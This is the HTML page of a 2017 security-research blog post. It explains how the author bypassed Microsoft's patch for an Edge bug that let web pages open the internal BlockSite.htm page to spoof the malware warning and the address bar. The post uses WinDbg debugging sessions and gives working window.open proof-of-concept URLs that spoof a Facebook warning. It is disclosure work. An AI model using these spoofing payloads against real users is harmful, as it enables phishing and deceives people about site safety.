<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge) | BrokenBrowser - Fun with browser vulnerabilities</title>
<meta name="keywords" content="">
<meta name="description" content="Yesterday, Microsoft pushed a gigantic update where tons of security bugs were fortunately killed, including most ones from this website. Kudos, big kudos to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the ridiculous IE policies to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.
Bug hunter, if you haven’t seen the original bug, please do so before reading the post below which explains how to bypass the patch.">
<meta name="author" content="magicmac">
<link rel="canonical" href="/posts/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6a98292fb8fa8cf0f3ba4042d4b75515c04267550f3ad49ff6271b5af9562443.css" integrity="sha256-apgpL7j6jPDzukBC1LdVFcBCZ1UPOtSf9icbWvlWJEM=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="mask-icon" href="/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)" />
<meta property="og:description" content="Yesterday, Microsoft pushed a gigantic update where tons of security bugs were fortunately killed, including most ones from this website. Kudos, big kudos to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the ridiculous IE policies to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.
Bug hunter, if you haven’t seen the original bug, please do so before reading the post below which explains how to bypass the patch." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2017-03-15T21:39:02-03:00" />
<meta property="article:modified_time" content="2017-03-15T21:39:02-03:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)"/>
<meta name="twitter:description" content="Yesterday, Microsoft pushed a gigantic update where tons of security bugs were fortunately killed, including most ones from this website. Kudos, big kudos to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the ridiculous IE policies to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.
Bug hunter, if you haven’t seen the original bug, please do so before reading the post below which explains how to bypass the patch."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "/posts/"
    }
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)",
      "item": "/posts/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)",
  "name": "Bypassing the patch to keep spoofing the Smartscreen\/Malware warning (Edge)",
  "description": "Yesterday, Microsoft pushed a gigantic update where tons of security bugs were fortunately killed, including most ones from this website. Kudos, big kudos to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the ridiculous IE policies to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.\nBug hunter, if you haven’t seen the original bug, please do so before reading the post below which explains how to bypass the patch.",
  "keywords": [
    
  ],
  "articleBody": "Yesterday, Microsoft pushed a gigantic update where tons of security bugs were fortunately killed, including most ones from this website. Kudos, big kudos to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the ridiculous IE policies to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.\nBug hunter, if you haven’t seen the original bug, please do so before reading the post below which explains how to bypass the patch.\n[ Update: this bug was patched on 2017-05-09 by also bypassed the same day ]\nNew PoC [2017-05-09]\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages/\\\\BlockSite.htm?BlockedDomain=facebook.com\u0026Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com\"); Super Quick Recap MS Edge allowed us to load some of its internal resources including html pages like acr_error.htm but it did not not allow us to load BlockSite.htm. Why? Because this last page can be easily used to spoof the internal malware warning message and the address bar. We bypassed that restriction a few months ago by changing a dot from the URL to its escaped counterpart %2e and now it has been patched. Edge developers are decoding (unescaping) our tricky URL before doing the check/string comparison, so, we need to find another way. Come on bug hunter! Close that facebook tab which is distracting you, taking your time for nothing. Close it and let’s dive into this fascinating ocean of super-interesting bits.\nNo symbols today Microsoft did not upload many of their public symbols yet so our analysis won’t be as pretty as it could have been in a week (once symbols are up). But no worries because we will try to bypass this anyway, just keep in mind that we will go straight to the point using the attacker’s approach: we just want to bypass the patch and that’s it. I don’t imagine an attacker thinking “oh, I need to take a week off because Microsoft didn’t push the symbols yet“.\nFinding the string “blocksite.htm” We know that somewhere in the gigantic Edge code there has to be a string comparison against BlockSite.htm, so we will attach to Edge, find that string and set a breakpoint on memory access to see which code tries to read it.\nThe following JavaScript code throws an ACCESS_DENIED without even opening the new window.\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm\"); Edge is blocking this internal URL for a good reason: this particular error page accepts arguments in the hash/query-string allowing the attacker to spoof the address-bar and content of the page.\nOur goal is to open that URL fooling Edge again. However, for this task we will use the following URL (encoded dot and facebook at the end so we can later recognize our own string in memory)\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com\"); Let’s attach to Edge and find the string BlockSite.htm limiting our search to the EdgeHtml.dll module, where most Edge code resides. It’s just a guess and if we don’t find anything we will try other modules or even grep all Edge files.\nOnce attached to the correct Edge process, we will need to know the Edge module start/end address so we can do our search only in that memory range.\n0:029\u003e lm m edgehtml Browse full module list start end module name 00007fff`54ba0000 00007fff`5614d000 edgehtml Now we will feed the search command with that address range and the string that we are interested in. WinDbg syntax is intimidating for me but I can tell you that the instruction below is doing a search s and returning only the addresses [1] of a unicode string u between those ugly 64bit addresses. Ahh! the string is BlockSite.\n0:029\u003e s -[1]u 00007fff`54ba0000 00007fff`5614d000 \"BlockSite\" 0x00007fff`55d90846 0x00007fff`55d90944 0x00007fff`55e52c02 Nice. It seems WinDbg immediately returned three addresses. Let’s see if it got them right. Du du du. Like Dudú, my friend Eduardo who is nicknamed “Dudú”.\n0:029\u003e du 0x00007fff`55d90846; du 0x00007fff`55d90944; du0x00007fff`55e52c02 00007fff`55d90846 \"BlockSite.htm\" 00007fff`55d90944 \"BlockSite.htm\" 00007fff`55e52c02 \"BlockSite.htm\" I’m getting excited. We will set a breakpoint on memory access on those three addresses. We want to find out who is accessing that string.\nba r1 0x00007fff`55d90846 ba r1 0x00007fff`55d90944 ba r1 0x00007fff`55e52c02 g (keep running, Edge!) Excellent. Now let’s go to our JavaScript code and try to open our malicious (buuhh!) URL.\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com\"); Wow! Immediate breakpoint. We are back into WinDbg. Let’s see what we have.\nBreakpoint 0 hit KERNELBASE!lstrlenW+0x18: 00007fff`74f6e2c8 75f6 jne KERNELBASE!lstrlenW+0x10 (00007fff`74f6e2c0) [br=1] It seems that we are in a kernelbase module right now but our goal is to find out which code of the EdgeHtml module referenced this string. Let’s take a look at the latest 5 calls in the stack trace.\n0:013\u003e k 5 # Child-SP RetAddr Call Site 00 000000d3`14df8de8 00007fff`74f70244 KERNELBASE!lstrlenW+0x18 01 000000d3`14df8df0 00007fff`54fee629 KERNELBASE!StrStrIW+0x54 02 000000d3`14df8eb0 00007fff`55004e6b edgehtml!Ordinal107+0xc6059 03 000000d3`14df9f50 00007fff`55007272 edgehtml!Ordinal107+0xdc89b 04 000000d3`14df9f80 00007fff`55004cae edgehtml!Ordinal107+0xdeca2 The first two belong to the kernelbase module, but the following one comes from edgehtml. To be clear, a piece of code from the edgehtml has called the function StrStrIW from the kernelbase module/library which seems to be pretty standard. A quick Google search for StrStrIW takes us to the function documentation on MSDN:\nThe documentation is pretty clear and thanks to the stack-trace, we know that edgehtml is calling this function. Let’s set a breakpoint into the Edge returning address to analyze the code before that point. (By the way, we can arrive to the same point using a “step to next return” twice (pt). Experiment!)\nbp edgehtml!Ordinal107+0xc6059 g Bang! We immediately break here\nBreakpoint 3 hit edgehtml!Ordinal107+0xc6059: 00007fff`54fee629 4885c0 test rax,rax But we are just coming back from the string comparison, so let’s look a bit up to see what happened. In WinDbg we can quickly unassemble backward (ub)\n0:013\u003e ub $ip edgehtml!Ordinal107+0xc602d: 00007fff`54fee5fd lea rdx,[edgehtml!Ordinal138+0x3e4ff8 (00007fff`55d5e6b8)] 00007fff`54fee604 lea rcx,[rsp+30h] 00007fff`54fee609 call qword ptr [edgehtml!Ordinal138+0x38b5b8 (00007fff`55d04c78)] 00007fff`54fee60f test eax,eax 00007fff`54fee611 jne edgehtml!Ordinal107+0xc6108 (00007fff`54fee6d8) 00007fff`54fee617 lea rdx,[edgehtml!Ordinal138+0x417160] (Second Argument) 00007fff`54fee61e lea rcx,[rsp+30h] (First Argument) 00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8] Great. Unfortunately we don’t have all the symbols here so everything looks a bit ugly. But no worries, we know we’ve just returned from the call above (the latest line) right? And before that call, there are two arguments being passed, one in rdx and another one in rcx (those two lea). But we have no idea what’s there at this point because the call already executed and those values could have been changed. Let’s examine this closer by setting a breakpoint in the latest call (so it does not execute) and once we are there examine its arguments:\nbd * (disable previous breakpoints) bp 00007fff`54fee623 g Now we will have a chance to see exactly what’s there before the comparison. Run the same JavaScript statement\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com\"); Which fires the breakpoint just before doing the string comparison.\nBreakpoint 4 hit edgehtml!Ordinal107+0xc6053: 00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8] ds:00007fff`55d04c88={KERNELBASE!StrStrIW (00007fff`74f701f0)} Let’s inspect the arguments passed to the StrStrl function:\n0:013\u003e du @rcx (First argument) 000000d3`14df8ee0 \"ms-appx-web://microsoft.microsof\" 000000d3`14df8f20 \"tedge/assets/errorpages/BlockSit\" 000000d3`14df8f60 \"e.htm?BlockedDomain=facebook.com\" 0:013\u003e du @rdx (Second argument) 00007fff`55d90820 \"/assets/errorPages/BlockSite.htm\" Aha! We can see here that our %2e (the dot) has already been decoded (it’s a dot instead of our %2e). It seems to me that Edge calls the StrStrl function and then checks if “/assets/errorPages/BlockSite.htm” exists in our URL. Not sure, the following pseudoCode is what I believe at this point:\nvar url = \"ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm?BlockedDomain=facebook.com\"; var badString = \"/assets/errorPages/BlockSite.htm\"; if (badString is inside URL) ACCESS_DENIED; It is important to remember that we are speculating here, because in reality we haven’ts seen yet any check after this comparison, but because we do have the comparison in front of our eyes, we expect that to happen soon. However, we don’t care too much as long as we can bypass this again, using a similar technique.\nThe main issue here is that the comparison checks against a hardcoded string but we know URLs can be written in many different ways. Our previous trick was to encode a dot but now we should think of a new one because we know we are being unencoded, and we know the exact string comparison being done.\nMany ideas come to my mind like multiple encoding or adding more slashes to the URL. Let’s try by adding a slash in the middle which will fool the string check but hopefully will work as a valid URL. So, we will add a dash after errorPages, just like this:\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com\"); Wow! It seems a simple double slash bypasses the patch but still, Edge is able to load the URL. Let’s build a better query-string now to completely spoof the malware-page, just as we did before.\nwindow.open(\"ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com\u0026Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com\"); Check out the PoC Live on Edge Bug hunter, there are more bypasses coming! Stay tuned and please don’t waste your precious minutes looking at your friend’s vacation pictures :). Close that Facebook tab.\nHave a nice day!\nManuel.\n",
  "wordCount" : "1482",
  "inLanguage": "en",
  "datePublished": "2017-03-15T21:39:02-03:00",
  "dateModified": "2017-03-15T21:39:02-03:00",
  "author":{
    "@type": "Person",
    "name": "magicmac"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/bypass-the-patch-to-keep-spoofing-the-address-bar-with-the-malware-warning/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "BrokenBrowser - Fun with browser vulnerabilities",
    "logo": {
      "@type": "ImageObject",
      "url": "/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="/" accesskey="h" title="BrokenBrowser - Fun with browser vulnerabilities (Alt + H)">BrokenBrowser - Fun with browser vulnerabilities</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title">
      Bypassing the patch to keep spoofing the Smartscreen/Malware warning (Edge)
    </h1>
    <div class="post-meta"><span title='2017-03-15 21:39:02 -0300 -03'>March 15, 2017</span>&nbsp;·&nbsp;magicmac

</div>
  </header> 
  <div class="post-content"><p>Yesterday, Microsoft pushed a <a href="https://technet.microsoft.com/library/security/MS17-006">gigantic update</a> where tons of security bugs were fortunately killed, including most ones from this website. Kudos, <strong>big kudos</strong> to the Edge developers and the ones in charge of its security. Please, convince the ones who want to keep the <a href="https://www.brokenbrowser.com/on-patching-security-bugs/">ridiculous IE policies</a> to change their minds or at least publicly explain why they don’t care about IE, at all. Kill it or protect it.</p>
<p>Bug hunter, if you haven’t seen the <a href="https://www.brokenbrowser.com/spoof-addressbar-malware/">original bug</a>, please do so before reading the post below which explains how to bypass the patch.</p>
<p><strong>[ Update: this bug was patched on 2017-05-09 by also bypassed the same day ]</strong></p>
<p><strong>New PoC [2017-05-09]</strong></p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages/\\BlockSite.htm?BlockedDomain=facebook.com&amp;Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com&#34;);
</code></pre><h2 id="super-quick-recap">Super Quick Recap<a hidden class="anchor" aria-hidden="true" href="#super-quick-recap">#</a></h2>
<p>MS Edge allowed us to load some of its internal resources including html pages like <em>acr_error.htm</em> but it did not not allow us to load <em>BlockSite.htm</em>. Why? Because this last page can be easily used to spoof the internal malware warning message <strong>and</strong> the address bar. We bypassed that restriction a few months ago by <a href="https://www.brokenbrowser.com/spoof-addressbar-malware/">changing a dot from the URL to its escaped counterpart %2e</a> and now it has been patched. Edge developers are decoding (unescaping) our tricky URL before doing the check/string comparison, so, we need to find another way. Come on bug hunter! Close that facebook tab which is distracting you, taking your time for nothing. Close it and let’s dive into this fascinating ocean of super-interesting bits.</p>
<h2 id="no-symbols-today">No symbols today<a hidden class="anchor" aria-hidden="true" href="#no-symbols-today">#</a></h2>
<p>Microsoft did not upload many of their public symbols yet so our analysis won’t be as pretty as it could have been in a week (once symbols are up). But no worries because we will try to bypass this anyway, just keep in mind that we will go straight to the point using the attacker’s approach: we just want to bypass the patch and that’s it. I don’t imagine an attacker thinking “<em>oh, I need to take a week off because Microsoft didn’t push the symbols yet</em>“.</p>
<h2 id="finding-the-string-blocksitehtm">Finding the string “blocksite.htm”<a hidden class="anchor" aria-hidden="true" href="#finding-the-string-blocksitehtm">#</a></h2>
<p>We know that somewhere in the gigantic Edge code there has to be a string comparison against <em>BlockSite.htm</em>, so we will attach to Edge, find that string and set a breakpoint on memory access to see which code tries to read it.</p>
<p>The following JavaScript code throws an ACCESS_DENIED without even opening the new window.</p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm&#34;);
</code></pre><p>Edge is blocking this internal URL for a good reason: this particular error page accepts arguments in the hash/query-string allowing the attacker to spoof the address-bar and content of the page.</p>
<p>Our goal is to open that URL fooling Edge again. However, for this task we will use the following URL (encoded dot and facebook at the end so we can later recognize our own string in memory)</p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com&#34;);
</code></pre><p>Let’s attach to Edge and find the string <em>BlockSite.htm</em> limiting our search to the EdgeHtml.dll module, where most Edge code resides. It’s just a guess and if we don’t find anything we will try other modules or even grep all Edge files.</p>
<p>Once attached to the correct Edge process, we will need to know the Edge module start/end address so we can do our search only in that memory range.</p>
<pre tabindex="0"><code>0:029&gt; lm m edgehtml

Browse full module list
start end module name
00007fff`54ba0000 00007fff`5614d000 edgehtml
</code></pre><p>Now we will feed the search command with that address range and the string that we are interested in. WinDbg syntax is intimidating for me but I can tell you that the instruction below is doing a search <strong>s</strong> and returning only the addresses <strong>[1]</strong> of a unicode string <strong>u</strong> between those ugly 64bit addresses. Ahh! the string is <em>BlockSite</em>.</p>
<pre tabindex="0"><code>0:029&gt; s -[1]u 00007fff`54ba0000 00007fff`5614d000 &#34;BlockSite&#34;
0x00007fff`55d90846
0x00007fff`55d90944
0x00007fff`55e52c02
</code></pre><p>Nice. It seems WinDbg immediately returned three addresses. Let’s see if it got them right. Du du du. Like Dudú, my friend Eduardo who is nicknamed “Dudú”.</p>
<pre tabindex="0"><code>0:029&gt; du 0x00007fff`55d90846; du 0x00007fff`55d90944; du0x00007fff`55e52c02
00007fff`55d90846 &#34;BlockSite.htm&#34;
00007fff`55d90944 &#34;BlockSite.htm&#34;
00007fff`55e52c02 &#34;BlockSite.htm&#34;
</code></pre><p>I’m getting excited. We will set a breakpoint on memory access on those three addresses. We want to find out who is accessing that string.</p>
<pre tabindex="0"><code>ba r1 0x00007fff`55d90846
ba r1 0x00007fff`55d90944
ba r1 0x00007fff`55e52c02
g (keep running, Edge!)
</code></pre><p>Excellent. Now let’s go to our JavaScript code and try to open our malicious (buuhh!) URL.</p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com&#34;);
</code></pre><p>Wow! Immediate breakpoint. We are back into WinDbg. Let’s see what we have.</p>
<pre tabindex="0"><code>Breakpoint 0 hit
KERNELBASE!lstrlenW+0x18:
00007fff`74f6e2c8 75f6 jne KERNELBASE!lstrlenW+0x10 (00007fff`74f6e2c0) [br=1]
</code></pre><p>It seems that we are in a kernelbase module right now but our goal is to find out which code <strong>of the EdgeHtml module</strong> referenced this string. Let’s take a look at the latest 5 calls in the stack trace.</p>
<pre tabindex="0"><code>0:013&gt; k 5
# Child-SP RetAddr Call Site
00 000000d3`14df8de8 00007fff`74f70244 KERNELBASE!lstrlenW+0x18
01 000000d3`14df8df0 00007fff`54fee629 KERNELBASE!StrStrIW+0x54
02 000000d3`14df8eb0 00007fff`55004e6b edgehtml!Ordinal107+0xc6059
03 000000d3`14df9f50 00007fff`55007272 edgehtml!Ordinal107+0xdc89b
04 000000d3`14df9f80 00007fff`55004cae edgehtml!Ordinal107+0xdeca2
</code></pre><p>The first two belong to the kernelbase module, but the following one comes from edgehtml. To be clear, a piece of code from the edgehtml has called the function StrStrIW from the kernelbase module/library which seems to be pretty standard. A quick Google search for <strong>StrStrIW</strong> takes us to the function <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb773439(v=vs.85).aspx">documentation on MSDN</a>:</p>
<p><img loading="lazy" src="/2017/03/01-str.png" alt=""  />
</p>
<p>The documentation is pretty clear and thanks to the stack-trace, we know that edgehtml is calling this function. Let’s set a breakpoint into the Edge returning address to <!-- raw HTML omitted -->analyze the code before that point<!-- raw HTML omitted -->. <em>(By the way, we can arrive to the same point using a “step to next return” twice (pt). Experiment!)</em></p>
<pre tabindex="0"><code>bp edgehtml!Ordinal107+0xc6059
g
</code></pre><p>Bang! We immediately break here</p>
<pre tabindex="0"><code>Breakpoint 3 hit
edgehtml!Ordinal107+0xc6059:
00007fff`54fee629 4885c0 test rax,rax
</code></pre><p>But we are just coming back from the string comparison, so let’s look a bit up to see what happened. In WinDbg we can quickly unassemble backward (ub)</p>
<pre tabindex="0"><code>0:013&gt; ub $ip
edgehtml!Ordinal107+0xc602d:
00007fff`54fee5fd lea rdx,[edgehtml!Ordinal138+0x3e4ff8 (00007fff`55d5e6b8)]
00007fff`54fee604 lea rcx,[rsp+30h]
00007fff`54fee609 call qword ptr [edgehtml!Ordinal138+0x38b5b8 (00007fff`55d04c78)]
00007fff`54fee60f test eax,eax
00007fff`54fee611 jne edgehtml!Ordinal107+0xc6108 (00007fff`54fee6d8)
00007fff`54fee617 lea rdx,[edgehtml!Ordinal138+0x417160] (Second Argument)
00007fff`54fee61e lea rcx,[rsp+30h]                      (First Argument)
00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8]
</code></pre><p>Great. Unfortunately we don’t have all the symbols here so everything looks a bit ugly. But no worries, we know we’ve just returned from the call above (the latest line) right? And before that call, there are two arguments being passed, one in <strong>rdx</strong> and another one in <strong>rcx</strong> (those two lea). But we have no idea what’s there at this point because the call already executed and those values could have been changed. Let’s examine this closer by setting a breakpoint in the latest call (so it does not execute) and once we are there examine its arguments:</p>
<pre tabindex="0"><code>bd * (disable previous breakpoints)
bp 00007fff`54fee623
g
</code></pre><p>Now we will have a chance to see exactly what’s there before the comparison. Run the same JavaScript statement</p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite%2ehtm?BlockedDomain=facebook.com&#34;);
</code></pre><p>Which fires the breakpoint just before doing the string comparison.</p>
<pre tabindex="0"><code>Breakpoint 4 hit
edgehtml!Ordinal107+0xc6053:
00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8] ds:00007fff`55d04c88={KERNELBASE!StrStrIW (00007fff`74f701f0)}
</code></pre><p>Let’s inspect the arguments passed to the StrStrl function:</p>
<pre tabindex="0"><code>0:013&gt; du @rcx (First argument)
000000d3`14df8ee0 &#34;ms-appx-web://microsoft.microsof&#34;
000000d3`14df8f20 &#34;tedge/assets/errorpages/BlockSit&#34;
000000d3`14df8f60 &#34;e.htm?BlockedDomain=facebook.com&#34;

0:013&gt; du @rdx (Second argument)
00007fff`55d90820 &#34;/assets/errorPages/BlockSite.htm&#34;
</code></pre><p>Aha! We can see here that our %2e (the dot) has already been decoded (it’s a dot instead of our %2e). It seems to me that Edge calls the StrStrl function and then checks if “/assets/errorPages/BlockSite.htm” exists in our URL. Not sure, the following pseudoCode is what I believe at this point:</p>
<pre tabindex="0"><code>var url = &#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm?BlockedDomain=facebook.com&#34;;
var badString = &#34;/assets/errorPages/BlockSite.htm&#34;;

if (badString is inside URL) ACCESS_DENIED;
</code></pre><p>It is important to remember that we are speculating here, because in reality we haven’ts seen yet any check after this comparison, but because we do have the comparison in front of our eyes, we expect that to happen soon. However, we don’t care too much as long as we can bypass this again, using a similar technique.</p>
<p>The main issue here is that the comparison checks against a hardcoded string but we know URLs can be written in many different ways. Our previous trick was to encode a dot but now we should think of a new one because we know we are being unencoded, and we know the exact string comparison being done.</p>
<p>Many ideas come to my mind like multiple encoding or adding more slashes to the URL. Let’s try by adding a slash in the middle which will fool the string check but hopefully will work as a valid URL. So, we will add a dash after errorPages, just like this:</p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com&#34;);
</code></pre><p><img loading="lazy" src="/2017/03/02-double-dash.png" alt=""  />
</p>
<p>Wow! It seems a simple double slash bypasses the patch but still, Edge is able to load the URL. Let’s build a better query-string now to completely spoof the malware-page, just as <a href="https://www.brokenbrowser.com/spoof-addressbar-malware/">we did before</a>.</p>
<pre tabindex="0"><code>window.open(&#34;ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com&amp;Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com&#34;);
</code></pre><p><img loading="lazy" src="/2017/03/03-justin-rogers.png" alt=""  />
</p>
<h2 id="check-out-the-poc-live-on-edgehttpswwwcrackingcomardemosedgesmartscreenpatch-bypass-2html"><a href="https://www.cracking.com.ar/demos/edgesmartscreen/patch-bypass-2.html">Check out the PoC Live on Edge</a><a hidden class="anchor" aria-hidden="true" href="#check-out-the-poc-live-on-edgehttpswwwcrackingcomardemosedgesmartscreenpatch-bypass-2html">#</a></h2>
<p>Bug hunter, there are more bypasses coming! Stay tuned and please don’t waste your precious minutes looking at your friend’s vacation pictures :). Close that Facebook tab.</p>
<p>Have a nice day!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a>.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="/">BrokenBrowser - Fun with browser vulnerabilities</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
